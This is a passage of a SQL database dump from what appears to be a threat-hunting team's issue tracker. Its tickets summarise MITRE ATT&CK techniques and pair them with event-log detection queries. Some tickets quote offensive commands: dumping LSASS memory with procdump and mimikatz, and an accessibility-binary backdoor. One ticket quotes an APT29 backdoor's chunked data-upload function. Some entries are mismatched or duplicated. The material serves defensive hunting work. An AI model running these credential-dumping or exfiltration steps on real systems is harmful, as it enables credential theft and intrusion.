access tasks created with schtasks or the Control Panel.\r\n\r\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID: (4698-4702)\r\nLeast Frequency Analysis\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1053/005/\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,4,'2021-05-06 15:40:23','2021-05-06 18:18:42','2021-05-06',0,NULL,5,5,28,29,0,NULL),(148,5,1,'Hide Artifacts: Hidden Files and Directories - T1564.001 (H)','\r\n\r\nAdversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).\r\n\r\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \".\" as the first character in the file or folder name [1] [2]. Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like \"ls\". Users must specifically change settings to have these files viewable.\r\n\r\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app [3]. On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\r\n\r\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.\r\n\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/T1564+-+Hide+Artifacts\r\n</pre>\r\n\r\n',NULL,NULL,1,NULL,2,NULL,1,1,'2021-05-06 15:45:42','2021-05-06 15:45:59','2021-05-06',0,NULL,30,30,36,37,0,NULL),(149,5,1,'Boot or Logon Autostart Execution: Winlogon Helper DLL - T1547.004','Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\Software[\\Wow6432Node\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon. [1]\r\n\r\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: [1]\r\n\r\n    Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\r\n    Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\r\n    Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\r\n\r\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/004/\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,7,'2021-05-06 15:45:54','2021-05-06 18:25:03','2021-05-06',0,NULL,5,5,30,31,0,NULL),(150,5,1,'Hide Artifacts: Hidden Window - T1564.003 (H)','Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.\r\n\r\n<pre>\r\n(Playbook) https://confluence.di2e.net/display/CYH836/T1564+-+Hide+Artifacts\r\nEventID: 4103 OR 4104 AND commandline: \"*powershell.exe -WindowStyle Hidden*\"\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,3,'2021-05-06 15:46:46','2021-05-06 15:52:11','2021-05-06',0,NULL,30,30,38,39,0,NULL),(151,5,1,'Access Token Manipulation: Token Impersonation/Theft - T1134.-001 (H)','Adversaries may duplicate then impersonate another user\'s token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using DuplicateToken(Ex). The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user\'s security context, or with SetThreadToken to assign the impersonated token to a thread.\r\n\r\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/T1134+-+Access+Token+Manipulation\r\n</pre>',NULL,NULL,1,NULL,1,NULL,1,2,'2021-05-06 15:48:29','2021-05-06 15:54:42','2021-05-06',0,NULL,30,30,40,41,0,NULL),(152,5,1,'Exploitation for Defense Evasion - T1211 (H)','Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\r\n\r\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for Security Software Discovery. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\r\n',NULL,NULL,1,NULL,2,NULL,1,2,'2021-05-06 15:49:38','2021-05-06 15:56:18','2021-05-06',0,NULL,30,30,42,43,0,NULL),(153,5,1,'Modify Registry  - T1112 (H)','Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\r\n\r\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for Security Software Discovery. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\r\n',NULL,NULL,1,NULL,1,NULL,1,2,'2021-05-06 15:51:06','2021-05-06 15:57:26','2021-05-06',0,NULL,30,30,44,45,0,NULL),(154,5,1,'Permission Groups Discovery - T1069','Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND \"Get-ManagementRoleAssignment\"\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\n\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,1,'2021-05-06 15:51:08','2021-05-06 18:17:05','2021-05-06',0,NULL,41,41,14,15,0,NULL),(155,5,1,'Command and Scripting Interpreter: PowerShell - T1059.005','Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\r\n\r\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\r\n\r\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads.\r\n\r\nh3. References \r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1059/005/\r\nhttps://confluence.di2e.net/display/CYH836/T1059+-+Command+and+Scripting+Interpreter\r\n</pre>\r\n',NULL,NULL,1,NULL,2,NULL,1,1,'2021-05-06 15:52:18','2021-05-06 15:53:25','2021-05-06',0,NULL,38,38,28,29,0,NULL),(156,5,1,'Access Token Manipulation: Create Process with Token -T1134.002 (H)','Adversaries may create a new process with a duplicated token to escalate privileges and bypass access controls. An adversary can duplicate a desired access token with DuplicateToken(Ex) and use it with CreateProcessWithTokenW to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.',NULL,NULL,1,NULL,1,NULL,1,2,'2021-05-06 15:52:37','2021-05-06 15:58:24','2021-05-06',0,NULL,30,30,46,47,0,NULL),(157,5,1,'Process Discovery - T1057','Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\n(Playbook) T1057 - Process Discovery\r\nEventID: 1 AND (commandline:\"*tasklist*\" AND processname:\"explorer.exe\") - for CLI execution\r\nEventID: 19 AND commandline:\"*Get-WMIobject*: AND processname:\"explorer.exe\") - for WMI execution\r\nEventID: 4103 OR 4104 AND (commandline:\"*Get-Process*\" OR commandline:\"*ps*\" OR commandline:\"*gps*\" AND processname:\"explorer.exe\") - for Powershell execution\r\nNOTE: processname:\"explorer.exe\" can be excluded.\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"tasklist /v\" OR \"tasklist /svc\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1057/\r\nhttps://attack.mitre.org/techniques/T1049/\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,4,'2021-05-06 15:53:35','2021-05-06 18:17:49','2021-05-06',0,NULL,41,41,16,17,0,NULL),(158,5,1,'Hide Artifacts - T1564 (H)','Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.\r\n\r\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.\r\n',NULL,NULL,1,NULL,1,NULL,1,1,'2021-05-06 15:53:50','2021-05-06 15:59:46','2021-05-06',0,NULL,30,30,48,49,0,NULL),(159,5,1,'File and directory discovery - T1083','Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : 1 AND CommandLine : *forfiles*\r\n(Playbook) T1083 - File and Directory Discovery\r\n\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"dir\" OR \"tree\" OR \"find\" OR \"locate\" OR \"ls\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attackhttps://attack.mitre.org/techniques/T1083/.mitre.org/techniques/T1083/\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,3,'2021-05-06 15:55:07','2021-05-06 18:16:58','2021-05-06',0,NULL,41,41,18,19,0,NULL),(160,5,1,'System Network Connections Discovery - T1049','Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.\r\n\r\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary\'s goals. Cloud providers may have different ways in which their virtual networks operate.[1][2][3]\r\n\r\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and lsof can be used to list current connections. who -a and w can be used to show which users are currently logged in, similar to \"net session\".\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\n(Playbook) T1087 - Account Discovery - CYH\r\nEventID: (1 OR 800 OR 4103 OR 4104 OR 4688) AND ProcessName: <Netstat, etc>\r\n\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"arp -a\" OR \"nbtstat -n\" OR \"net config\" OR \"ipconfig /all\" OR route)\r\n\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"netstat -an\" OR \"net use\" OR \"net file\" OR \"net session\" OR \"net time\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1049/\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,3,'2021-05-06 15:56:43','2021-05-06 18:26:55','2021-05-06',0,NULL,41,41,20,21,0,NULL),(161,5,1,'OS Credential Dumping: LSASS Memory - T1003.001','Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.\r\n\r\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\r\n\r\nFor example, on the target host use procdump:\r\n\r\n<pre>\r\nprocdump -ma lsass.exe lsass_dump\r\n</pre>\r\n\r\nLocally, mimikatz can be run using:\r\n\r\n<pre>\r\nsekurlsa::Minidump lsassdump.dmp\r\nsekurlsa::logonPasswords\r\n</pre>\r\n\r\nWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user\'s Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\r\n\r\nThe following SSPs can be used to access credentials:\r\n<pre>\r\nMsv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\r\nWdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges\r\nKerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\r\nCredSSP: Provides SSO and Network Level Authentication for Remote Desktop Services.\r\n</pre>\r\n\r\nReference:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1003/001/\r\n</pre>\r\n\r\nPlaybook:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/LSASS+Access+from+Non+System+Account+T1003\r\n</pre>\r\n',NULL,NULL,1,NULL,2,NULL,1,3,'2021-05-06 16:08:58','2021-05-06 16:16:06','2021-05-06',0,NULL,81,81,6,7,0,NULL),(162,5,1,'Brute Force - T1110','Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\r\n\r\nReference:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1110/\r\n</pre>\r\n\r\n\r\nPlaybook:\r\n<pre>https://confluence.di2e.net/display/CYH836/T1110+-+Brute+Force+Turla\r\n</pre>',NULL,NULL,1,NULL,2,NULL,1,2,'2021-05-06 16:17:33','2021-05-06 17:48:58','2021-05-06',0,NULL,81,81,8,9,0,NULL),(163,5,1,'System Information Discovery - T1082','An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nTools such as Systeminfo can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS systemsetup command, but it requires administrative privileges.\r\n\r\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.[1][2][3]\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (systeminfo OR gpresult OR set)\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1082/\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,1,'2021-05-06 17:46:39','2021-05-06 18:12:58','2021-05-06',0,NULL,41,41,22,23,0,NULL),(164,5,1,'Account Discovery: Local Account - T1087','Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net user\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1087/001/\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,1,'2021-05-06 17:49:11','2021-05-06 18:10:31','2021-05-06',0,NULL,41,41,24,25,0,NULL),(166,5,1,'Password Policy Discovery - T1201','Adversaries may attempt to access detailed information about the password policy used within an enterprise network. Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as \'pass123\'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\r\n\r\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as net accounts (/domain), Get-ADDefaultDomainPasswordPolicy, chage -l , cat /etc/pam.d/common-password, and pwpolicy getaccountpolicies.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net accounts\" OR \"net accounts /domain\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1201/\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,1,'2021-05-06 17:53:14','2021-05-06 18:08:49','2021-05-06',0,NULL,41,41,26,27,0,NULL),(167,5,1,'Query Registry - T1012','Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\r\n\r\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.[1] Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\n*+Hunter Notes:+* \r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"reg query\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1012/\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,1,'2021-05-06 17:55:58','2021-05-06 18:02:10','2021-05-06',0,NULL,41,41,28,29,0,NULL),(168,5,1,'Permission Groups Discovery: Local Groups - T1069.001 ','Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\r\n\r\nCommands such as net localgroup of the Net utility, dscl . -list /Groups on macOS, and groups on Linux can list local groups.\r\n\r\n*+Hunter Notes:+* \r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net localgroup\" OR \"net localgroup Administrators\") OR (\"net group \"Domain Admins\" /domain\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1069/001/\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,2,'2021-05-06 18:15:36','2021-05-06 18:35:02','2021-05-06',0,NULL,41,41,30,31,0,NULL),(169,5,1,'Peripheral Device Discovery - T1120','Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.\r\n\r\n*+Hunter Notes:+* \r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (fsutil)\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1120/\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,1,'2021-05-06 18:19:31','2021-05-06 18:19:31','2021-05-06',0,NULL,41,41,32,33,0,NULL),(170,5,1,'System Time Discovery - T1124','An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. [1] [2]\r\n\r\nSystem time information may be gathered in a number of ways, such as with Net on Windows by performing net time \\hostname to gather the system time on a remote system. The victim\'s time zone may also be inferred from the current system time or gathered by using w32tm /tz. [2]\r\n\r\nThis information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job [3], or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.[4]\r\n\r\n*+Hunter Notes:+* \r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net time\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1124/\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,1,'2021-05-06 18:22:04','2021-05-06 18:22:04','2021-05-06',0,NULL,41,41,34,35,0,NULL),(171,5,1,'Internet Connection Discovery - T1016.001','Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, tracert, and GET requests to websites.\r\n\r\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.\r\n\r\n*+Hunter Notes:+* \r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (tracert)\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1016/001/\r\n</pre>',NULL,NULL,1,NULL,3,NULL,1,1,'2021-05-06 18:25:32','2021-05-06 18:25:32','2021-05-06',0,NULL,41,41,36,37,0,NULL),(172,5,1,'Event Triggered Execution: Accessibility Features - T1548.008','Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\r\n\r\nTwo common accessibility programs are C:\\Windows\\System32\\sethc.exe, launched when the shift key is pressed five times and C:\\Windows\\System32\\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. [1]\r\n\r\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\\, and it must be protected by Windows File or Resource Protection (WFP/WRP). [2] The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\r\n\r\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., C:\\Windows\\System32\\utilman.exe) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges. [3]\r\n\r\nOther accessibility features exist that may also be leveraged in a similar fashion: [2][4]\r\n\r\n    On-Screen Keyboard: C:\\Windows\\System32\\osk.exe\r\n    Magnifier: C:\\Windows\\System32\\Magnify.exe\r\n    Narrator: C:\\Windows\\System32\\Narrator.exe\r\n    Display Switcher: C:\\Windows\\System32\\DisplaySwitch.exe\r\n    App Switcher: C:\\Windows\\System32\\AtBroker.exe\r\n\r\n',NULL,NULL,1,NULL,2,NULL,1,0,'2021-05-06 18:29:18','2021-05-06 18:29:18','2021-05-06',0,NULL,5,5,32,33,0,NULL),(173,5,1,'Permission Groups Discovery: Domain Groups -T1069.002','Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\r\n\r\nCommands such as net group /domain of the Net utility, dscacheutil -q group on macOS, and ldapsearch on Linux can list domain-level groups.\r\n',NULL,NULL,1,NULL,2,NULL,1,0,'2021-05-06 18:35:31','2021-05-06 18:35:31','2021-05-06',0,NULL,41,41,38,39,0,NULL);
/*!40000 ALTER TABLE `issues` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `journal_details`
--

DROP TABLE IF EXISTS `journal_details`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `journal_details` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `journal_id` int(11) NOT NULL DEFAULT '0',
  `property` varchar(30) NOT NULL DEFAULT '',
  `prop_key` varchar(30) NOT NULL DEFAULT '',
  `old_value` longtext,
  `value` longtext,
  PRIMARY KEY (`id`),
  KEY `journal_details_journal_id` (`journal_id`)
) ENGINE=InnoDB AUTO_INCREMENT=366 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `journal_details`
--

LOCK TABLES `journal_details` WRITE;
/*!40000 ALTER TABLE `journal_details` DISABLE KEYS */;
INSERT INTO `journal_details` VALUES (1,1,'attr','parent_id','1',NULL),(2,2,'attr','parent_id','1',NULL),(3,3,'attr','parent_id','1',NULL),(4,4,'attr','priority_id','1','4'),(5,5,'attr','parent_id',NULL,'1'),(6,6,'attr','parent_id',NULL,'1'),(7,7,'attr','parent_id',NULL,'1'),(8,8,'attr','subject','Lateral Movement','Lateral Movement - Parent Ticket'),(9,9,'attr','subject','Persistence','Persistence - Parent Ticket'),(10,9,'attr','priority_id','4','1'),(11,10,'attr','priority_id','2','1'),(12,11,'attr','tracker_id','1','5'),(13,12,'attr','description','The APT29 POSHSPY backdoor uploads data in 2048-byte chunks. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"\r\n\r\n<pre>\r\nevent.code : 5156 or 3 or 4688 -- \r\nThe following provides an example of data uploading in 2048-byte chunks:\r\n\r\nfunction uploadDataAuth($data, $clnPass, $url, $ua, $ck)\r\n\r\n{\r\n      $dataHexStr = (prepareDataSend $data.pckd)\r\n\r\n      if($dataHexStr -eq $null -or $dataHexStr.Length -eq 0 -or\r\n\r\n ($dataHexStr.Length % 2) -ne 0)\r\n\r\n      {return $false}\r\n\r\n      try{\r\n\r\n            [uint32]$chunks = [Math]::Floor($dataHexStr.Length / 2048) + 1\r\n\r\n            for($i=0; $i -lt ($chunks-1); $i++)\r\n\r\n            {\r\n                  if($false -eq (uploadChunk $dataHexStr.Substring(2048*$i,\r\n\r\n 2048) $clnPass $url $ua $ck))\r\n\r\n                  {return $false}\r\n\r\n            }\r\n\r\n            return (uploadChunk $dataHexStr.Substring(2048*($chunks-1))\r\n\r\n $clnPass $url $ua $ck $dataHexStr.Length)\r\n\r\n      }\r\n\r\n      catch{return $false}\r\n\r\n}\r\nThe following provides an example of uploading data in 2048-byte chunks:\r\n\r\nfunction uploadDataAuth($data, $clnPass, $url, $ua, $ck)\r\n\r\n{\r\n\r\n      $dataHexStr = (prepareDataSend $data.pckd)\r\n\r\n      if($dataHexStr -eq $null -or $dataHexStr.Length -eq 0 -or\r\n\r\n ($dataHexStr.Length % 2) -ne 0)\r\n\r\n      {return $false}\r\n\r\n      try{\r\n\r\n            [uint32]$chunks = [Math]::Floor($dataHexStr.Length / 2048) + 1\r\n\r\n            for($i=0; $i -lt ($chunks-1); $i++)\r\n\r\n            {\r\n\r\n                  if($false -eq (uploadChunk $dataHexStr.Substring(2048*$i,\r\n\r\n 2048) $clnPass $url $ua $ck))\r\n\r\n                  {return $false}\r\n\r\n            }\r\n\r\n            return (uploadChunk $dataHexStr.Substring(2048*($chunks-1))\r\n\r\n $clnPass $url $ua $ck $dataHexStr.Length)\r\n\r\n      }\r\n\r\n      catch{return $false}\r\n\r\n}\r\n</pre?\r\n','The APT29 POSHSPY backdoor uploads data in 2048-byte chunks. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"\r\n\r\n\r\nNotes:\r\n<pre>\r\nevent.code : 5156 or 3 or 4688 -- \r\nThe following provides an example of data uploading in 2048-byte 